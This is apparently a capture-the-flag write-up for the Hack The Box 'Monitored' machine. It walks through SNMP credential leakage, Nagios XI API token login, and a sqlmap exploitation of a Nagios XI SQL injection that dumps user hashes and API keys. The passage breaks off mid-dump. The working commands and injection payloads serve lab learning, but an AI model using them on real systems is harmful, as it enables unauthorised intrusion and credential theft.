---
layout: writeup
category: HTB
points: 40 
solves: 3968
tags: udp snmp nagiosxi api nagios_rce sudoers abusing_nagios_scripts
description: In this machine, we have a snmp service that leaks credentials that we can use to nagiosxi using the api because in the normal login is disabled. Then, we can abuse a nagiosxi version 5.11.3 SQL injection vulnerability to retrive the api key of the nagiosadmin user and create a new user with admin privileges with this apikey. Next, we create a command in nagiosxi commmand utility to receive a reverse shell as nagios user. Finally, we can abuse sudoers privilege to run a nagios script that has a vulnerability that allow us to create a symlink to /root/.ssh/id_rsa of one of the file that is going for backup and escalate to root. 
date: 2024-05-11
comments: false
title: HTB Monitored Writeup
---

In this machine, we have a snmp service that leaks credentials that we can use to nagiosxi using the api because in the normal login is disabled. Then, we can abuse a nagiosxi version 5.11.3 SQL injection vulnerability to retrive the api key of the nagiosadmin user and create a new user with admin privileges with this apikey. Next, we create a command in nagiosxi commmand utility to receive a reverse shell as nagios user. Finally, we can abuse sudoers privilege to run a nagios script that has a vulnerability that allow us to create a symlink to /root/.ssh/id_rsa of one of the file that is going for backup and escalate to root.

# Enumeration

## Port Scanning

Let's start with a port scanning with nmap to see which ports are opened

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -n -Pn 10.10.11.248 -oN tcpTargeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 20:35 CEST
Nmap scan report for 10.10.11.248
Host is up (0.22s latency).
Not shown: 60939 closed tcp ports (reset), 4591 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Nagios XI
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_http-server-header: Apache/2.4.56 (Debian)
5667/tcp open  tcpwrapped
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.34 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a real environment).
* -n: Disables DNS resolution protocol.
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

Also, a UDP scan (besides TCP) for this machine is useful:

```bash
❯ sudo nmap -p- --min-rate 5000 -sU --open -n -Pn 10.10.11.248 -oN udpTargeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 20:40 CEST
Warning: 10.10.11.248 giving up on port because retransmission cap hit (10).
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 18.82% done; ETC: 20:42 (0:01:56 remaining)
Nmap scan report for 10.10.11.248
Host is up (0.29s latency).
Not shown: 65384 open|filtered udp ports (no-response), 149 closed udp ports (port-unreach)
PORT    STATE SERVICE
123/udp open  ntp
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 147.19 seconds
```

Let's enumerate the snmp service with [this guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp) (remember that [HackTricks](https://book.hacktricks.xyz) helps a lot) which seems interesting.

## SNMP enumeration

First, we have to discover the community string (is like a password for snmp) bruteforcing with a tool called onesixtyone and a dictionary from SecLists (/opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt):

```bash
❯ onesixtyone -c /opt/SecLists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.11.248
Scanning 1 hosts, 120 communities
10.10.11.248 [public] Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
```

We can see that public is a valid one, now let's enumerate the information from this service with snmpbulkwalk (snmpwalk goes very slow) and grab it to a file to easily see the info:

```bash
❯ snmpbulkwalk -c public -v2c 10.10.11.248 . | tee snmp_output.txt
SNMPv2-MIB::sysDescr.0 = STRING: Linux monitored 5.10.0-28-amd64 #1 SMP Debian 5.10.209-2 (2024-01-31) x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (13924496) 1 day, 14:40:44.96
SNMPv2-MIB::sysContact.0 = STRING: Me <root@monitored.htb>
SNMPv2-MIB::sysName.0 = STRING: monitored
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (110) 0:00:01.10
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORID.11 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORDescr.11 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (2) 0:00:00.02
SNMPv2-MIB::sysORUpTime.11 = Timeticks: (110) 0:00:01.10
[-- SNIP --]
```

Looking at the file we can see a sudo process that leaks a password:

```bash
❯ cat snmp_output.txt | grep svc
HOST-RESOURCES-MIB::hrSWRunParameters.618 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
HOST-RESOURCES-MIB::hrSWRunParameters.1404 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
HOST-RESOURCES-MIB::hrSWRunParameters.1406 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
```

Now let's see in the web for what we can use this password.

## Web enumeration

The port 80 always redirects to https://nagios.monitored.htb:

```bash
❯ whatweb http://10.10.11.248
http://10.10.11.248 [301 Moved Permanently] Apache[2.4.56], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.10.11.248], RedirectLocation[https://nagios.monitored.htb/], Title[301 Moved Permanently]
https://nagios.monitored.htb/ [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.10.11.248], JQuery[3.6.0], Script[text/javascript], Title[Nagios XI]
```

So let's add it to the /etc/hosts:

```bash
❯ echo "10.10.11.248 monitored.htb nagios.monitored.htb" | sudo tee -a /etc/hosts
```

Fuzzing for subdomains we don't have nothing useful:

```bash
❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.monitored.htb" -u https://monitored.htb --hh=3245
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://monitored.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================


Total time: 26.99152
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 184.8358
```

In nagios.monitored.htb, we have a Nagios XI page:

![Nagios XI page](/assets/images/Monitored/main_page.png)

And a Nagios XI login page when we click "Access Nagios XI":

![Nagios XI login](/assets/images/Monitored/nagiosxi_login.png)

Let's try the credentials that we grabbed before in SNMP:

![Nagios XI Login svc](/assets/images/Monitored/nagiosxi_login_svc.png)

It has a different error message than if we put another random thing, so it is likely that the account exists:

![Different login error message](/assets/images/Monitored/different_login_error_message.png)

So now we have to search another method for login in Nagios XI fuzzing (I'll use feroxbuster for recursive searching):

```bash
❯ feroxbuster --url https://nagios.monitored.htb/nagiosxi/ -k
                                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://nagios.monitored.htb/nagiosxi/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      283c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      286c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/ => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/admin => https://nagios.monitored.htb/nagiosxi/admin/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/images => https://nagios.monitored.htb/nagiosxi/images/
301      GET        9l       28w      342c https://nagios.monitored.htb/nagiosxi/includes => https://nagios.monitored.htb/nagiosxi/includes/
301      GET        9l       28w      338c https://nagios.monitored.htb/nagiosxi/help => https://nagios.monitored.htb/nagiosxi/help/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/config => https://nagios.monitored.htb/nagiosxi/config/
301      GET        9l       28w      337c https://nagios.monitored.htb/nagiosxi/api => https://nagios.monitored.htb/nagiosxi/api/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/tools => https://nagios.monitored.htb/nagiosxi/tools/
301      GET        9l       28w      336c https://nagios.monitored.htb/nagiosxi/db => https://nagios.monitored.htb/nagiosxi/db/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/about => https://nagios.monitored.htb/nagiosxi/about/
301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/account => https://nagios.monitored.htb/nagiosxi/account/
301      GET        9l       28w      345c https://nagios.monitored.htb/nagiosxi/includes/js => https://nagios.monitored.htb/nagiosxi/includes/js/
301      GET        9l       28w      353c https://nagios.monitored.htb/nagiosxi/includes/components => https://nagios.monitored.htb/nagiosxi/includes/components/
301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/includes/css => https://nagios.monitored.htb/nagiosxi/includes/css/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/mobile => https://nagios.monitored.htb/nagiosxi/mobile/
301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/api/includes => https://nagios.monitored.htb/nagiosxi/api/includes/
301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/reports => https://nagios.monitored.htb/nagiosxi/reports/
301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/includes/lang => https://nagios.monitored.htb/nagiosxi/includes/lang/
301      GET        9l       28w      352c https://nagios.monitored.htb/nagiosxi/includes/js/themes => https://nagios.monitored.htb/nagiosxi/includes/js/themes/
301      GET        9l       28w      353c https://nagios.monitored.htb/nagiosxi/includes/css/themes => https://nagios.monitored.htb/nagiosxi/includes/css/themes/
301      GET        9l       28w      348c https://nagios.monitored.htb/nagiosxi/includes/fonts => https://nagios.monitored.htb/nagiosxi/includes/fonts/
301      GET        9l       28w      363c https://nagios.monitored.htb/nagiosxi/includes/components/favorites => https://nagios.monitored.htb/nagiosxi/includes/components/favorites/
301      GET        9l       28w      361c https://nagios.monitored.htb/nagiosxi/includes/components/profile => https://nagios.monitored.htb/nagiosxi/includes/components/profile/
301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/mobile/static => https://nagios.monitored.htb/nagiosxi/mobile/static/
301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/backend => https://nagios.monitored.htb/nagiosxi/backend/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/views => https://nagios.monitored.htb/nagiosxi/views/
301      GET        9l       28w      352c https://nagios.monitored.htb/nagiosxi/includes/js/jquery => https://nagios.monitored.htb/nagiosxi/includes/js/jquery/
```

* -k -> Allow self-signed certificates

In the /mobile path, we have a login interface for mobiles, but it also didn't work login here:

![Nagios XI mobile](/assets/images/Monitored/nagiosxi_mobile.png)

The only other interesting path to login is the api. Looking in the [documentation](https://assets.nagios.com/downloads/nagiosxi/docs/Accessing_The_XI_Backend_API.pdf) doesn't help so we have to fuzz manually the api (with GET and POST methods):

```bash
❯ feroxbuster --url https://nagios.monitored.htb/nagiosxi/api/ -m GET,POST -k -t 20
                                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://nagios.monitored.htb/nagiosxi/api/
 🚀  Threads               │ 20
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET, POST]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      286c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      283c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403     POST        9l       28w      286c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404     POST        9l       31w      283c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      346c https://nagios.monitored.htb/nagiosxi/api/includes => https://nagios.monitored.htb/nagiosxi/api/includes/
301     POST        9l       28w      346c https://nagios.monitored.htb/nagiosxi/api/includes => https://nagios.monitored.htb/nagiosxi/api/includes/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/api/v1 =
> https://nagios.monitored.htb/nagiosxi/api/v1/
200      GET        1l        7w       53c https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
200     POST        1l        6w       49c https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
```

We have the /v1 endpoint with authenticate and includes endpoint.

The includes endpoint doesn't have nothing interesting:

```bash
❯ curl -s -X GET https://nagios.monitored.htb/nagiosxi/api/v1/includes -k
{"error":"No API Key provided"}
❯ curl -s -X POST https://nagios.monitored.htb/nagiosxi/api/v1/includes -k
{"error":"No API Key provided"}
```

But authenticate seems to be the thing we are just looking for:

```bash
❯ curl -s -X GET https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k
{"error":"You can only use POST with authenticate."}
❯ curl -s -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k
{"error":"Must be valid username and password."}
❯ curl -s -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d 'username=svc&password=XjH7VCehowpR1xZB' -k
{"username":"svc","user_id":"2","auth_token":"ef77d3c4604b0bad112b25626238b2902de1d2fa","valid_min":5,"valid_until":"Sat, 11 May 2024 15:19:13 -0400"}
```

This [article](https://support.nagios.com/forum/viewtopic.php?t=58783) gives us an idea of how to use this token to login, he uses it in the ?token parameter of a php file. With that information, we can suppose that it also works for login.php:

![Access to Nagios XI panel](/assets/images/Monitored/access_to_nagiosxi_panel.png)

Looking for [vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-1424/product_id-26507/Nagios-Nagios-Xi.html) of Nagios XI, we can see two that are classified so dangerous with the CVSS score 9.8 (more info of CVSS [here](https://www.threatdown.com/blog/how-cvss-works-characterizing-and-scoring-vulnerabilities/)):

![Nagios XI vulns](/assets/images/Monitored/nagiosxi_vulns.png)

There is a SQL injection and a RCE for the version 5.11.3 and we are with a earlier version (5.11.0):

![Nagios version](/assets/images/Monitored/nagios_version.png)

Let's go for the SQL injection as it is described [here](https://outpost24.com/blog/nagios-xi-vulnerabilities/). We can confirm it adding a ':

![SQLi](/assets/images/Monitored/sqli.png)

Let's use sqlmap to enumerate databases:

```bash
❯ sqlmap -u https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php -X POST -H "Cookie: nagiosxi=d3m6ijoocsn93icrbbtgdmfq1b" --data 'action=acknowledge_banner_message&id=3' -p id --dbs --dbms="MySQL" --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:36:44 /2024-05-11/

[22:36:44] [INFO] testing connection to the target URL
[22:36:45] [INFO] testing if the target URL content is stable
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[22:36:46] [INFO] target URL content is stable

[..SNIP..]

POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 260 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (5294=5294) THEN 3 ELSE (SELECT 4062 UNION SELECT 3024) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 4094 FROM(SELECT COUNT(*),CONCAT(0x71626b7171,(SELECT (ELT(4094=4094,1))),0x7178786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 3340 FROM (SELECT(SLEEP(5)))DlLP)
---
[22:38:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:38:38] [INFO] fetching database names
[22:38:38] [INFO] retrieved: 'information_schema'
[22:38:39] [INFO] retrieved: 'nagiosxi'
available databases [2]:
[*] information_schema
[*] nagiosxi

[22:38:39] [INFO] fetched data logged to text files under '/home/gabri/.local/share/sqlmap/output/nagios.monitored.htb'

[*] ending @ 22:38:39 /2024-05-11/
```

We have the interesting database nagiosxi, as it says in the article above, the interesting tables are xi_users and xi_session so I will start retrieving the columns of xi_users:

```bash
❯ sqlmap -u https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php -X POST -H "Cookie: nagiosxi=d3m6ijoocsn93icrbbtgdmfq1b" --data 'action=acknowledge_banner_message&id=3' -p id -D nagiosxi -T xi_users --columns --dbms="MySQL"  --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:41:56 /2024-05-11/

[22:41:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (5294=5294) THEN 3 ELSE (SELECT 4062 UNION SELECT 3024) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 4094 FROM(SELECT COUNT(*),CONCAT(0x71626b7171,(SELECT (ELT(4094=4094,1))),0x7178786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 3340 FROM (SELECT(SLEEP(5)))DlLP)
---
[22:41:57] [INFO] testing MySQL
[22:41:57] [INFO] confirming MySQL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[22:41:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[22:41:57] [INFO] fetching columns for table 'xi_users' in database 'nagiosxi'
[22:41:57] [INFO] resumed: 'user_id'
[22:41:57] [INFO] resumed: 'int(11)'
[22:41:57] [INFO] resumed: 'username'
[22:41:57] [INFO] resumed: 'varchar(255)'
[22:41:57] [INFO] resumed: 'password'
[22:41:57] [INFO] resumed: 'varchar(128)'
[22:41:57] [INFO] resumed: 'name'
[22:41:57] [INFO] resumed: 'varchar(100)'
[22:41:57] [INFO] resumed: 'email'
[22:41:57] [INFO] resumed: 'varchar(128)'
[22:41:57] [INFO] resumed: 'backend_ticket'
[22:41:57] [INFO] resumed: 'varchar(128)'
[22:41:57] [INFO] resumed: 'enabled'
[22:41:57] [INFO] resumed: 'smallint(6)'
[22:41:57] [INFO] resumed: 'api_key'
[22:41:57] [INFO] resumed: 'varchar(128)'
[22:41:57] [INFO] resumed: 'api_enabled'
[22:41:57] [INFO] resumed: 'smallint(6)'
[22:41:57] [INFO] resumed: 'login_attempts'
[22:41:57] [INFO] resumed: 'smallint(6)'
[22:41:57] [INFO] resumed: 'last_attempt'
[22:41:57] [INFO] resumed: 'int(11)'
[22:41:57] [INFO] resumed: 'last_password_change'
[22:41:57] [INFO] resumed: 'int(11)'
[22:41:57] [INFO] resumed: 'last_login'
[22:41:57] [INFO] resumed: 'int(11)'
[22:41:57] [INFO] resumed: 'last_edited'
[22:41:57] [INFO] resumed: 'int(11)'
[22:41:57] [INFO] resumed: 'last_edited_by'
[22:41:57] [INFO] resumed: 'int(11)'
[22:41:57] [INFO] resumed: 'created_by'
[22:41:57] [INFO] resumed: 'int(11)'
[22:41:57] [INFO] resumed: 'created_time'
[22:41:57] [INFO] resumed: 'int(11)'
Database: nagiosxi
Table: xi_users
[17 columns]
+----------------------+--------------+
| Column               | Type         |
+----------------------+--------------+
| name                 | varchar(100) |
| api_enabled          | smallint(6)  |
| api_key              | varchar(128) |
| backend_ticket       | varchar(128) |
| created_by           | int(11)      |
| created_time         | int(11)      |
| email                | varchar(128) |
| enabled              | smallint(6)  |
| last_attempt         | int(11)      |
| last_edited          | int(11)      |
| last_edited_by       | int(11)      |
| last_login           | int(11)      |
| last_password_change | int(11)      |
| login_attempts       | smallint(6)  |
| password             | varchar(128) |
| user_id              | int(11)      |
| username             | varchar(255) |
+----------------------+--------------+

[22:41:57] [INFO] fetched data logged to text files under '/home/gabri/.local/share/sqlmap/output/nagios.monitored.htb'

[*] ending @ 22:41:57 /2024-05-11/
```

We have the interesting columns api_key, username and password, so let's retrieve them:

```bash
❯ sqlmap -u https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php -X POST -H "Cookie: nagiosxi=d3m6ijoocsn93icrbbtgdmfq1b" --data 'action=acknowledge_banner_message&id=3' -p id -D nagiosxi -T xi_users -C username,password,api_key --dump --dbms="MySQL"  --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:45:42 /2024-05-11/

[22:45:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (5294=5294) THEN 3 ELSE (SELECT 4062 UNION SELECT 3024) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 4094 FROM(SELECT COUNT(*),CONCAT(0x71626b7171,(SELECT (ELT(4094=4094,1))),0x7178786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 3340 FROM (SELECT(SLEEP(5)))DlLP)
---
[22:45:43] [INFO] testing MySQL
[22:45:43] [INFO] confirming MySQL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[22:45:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[22:45:43] [INFO] fetching entries of column(s) 'api_key,password,username' for table 'xi_users' in database 'nagiosxi'
[22:45:44] [INFO] retrieved: '2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK'
[22:45:44] [INFO] retrieved: '$2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK'
[22:45:45] [INFO] retrieved: 'svc'
[22:45:45] [INFO] retrieved: 'IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL'
[22:45:46] [INFO] retrieved: '$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C'
[22:45:46] [INFO] retrieved: 'nagiosadmin'
Database: nagiosxi
Table: xi_users
[2 entries]
+-------------+--------------------------------------------------------------+------------------------------------------------------------------+
| username    | password                                                     | api_key                                                          |
+-------------+--------------------------------------------------------------+------------------------------------------------------------------+
